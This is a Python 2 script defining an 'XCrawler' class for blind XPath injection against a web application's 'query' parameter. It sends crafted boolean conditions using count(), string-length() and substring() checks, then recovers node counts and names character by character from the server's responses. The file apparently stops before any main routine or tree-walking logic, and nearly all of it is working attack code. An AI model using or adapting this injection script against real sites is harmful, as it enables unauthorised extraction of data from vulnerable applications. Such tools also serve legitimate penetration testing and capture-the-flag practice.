#!/usr/bin/env python
import argparse
import string
import urllib
import urllib2
from xml.dom.minidom import *


class XCrawler(object):
    strTrue = " and '1'='1"
    strFalse = " and '1'='0"
    strCount = "' and count({})={}"
    strLength = "' and string-length({})={}"
    strSub = "' and substring({},1,{}) = '{}'"
    strConfirm = "' exists"
    charList = string.ascii_letters + string.digits

    def __init__(self):
        args = self.set_args()
        self.url = args.url
        self.xml = Document()

    def count_node(self, path):
        count = 0
        for i in range(0, 10000):
            payload = self.make_payload(self.strCount.format(path, i))
            if self.get_request(payload):
                count = i
                break
        return count

    def find_length(self, path):
        length = 0
        for i in range(1, 100):
            payload = self.make_payload(self.strLength.format(path, i))
            if self.get_request(payload):
                length = i
                break
        return length

    def find_name(self, path, length):
        name = ""
        for i in range(1, length + 1):
            for char in self.charList:
                payload = self.make_payload(self.strSub.format(path, i, name + char))
                if self.get_request(payload):
                    name += char
                    break
        return name

    def get_request(self, payload):
        response = urllib2.urlopen(self.url + "?" + payload)
        html = response.read()
        return self.strConfirm in html

    def make_payload(self, step):
        return urllib.urlencode({"query": "0" + step + self.strTrue})

    def set_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-url')
        return parser.parse_args()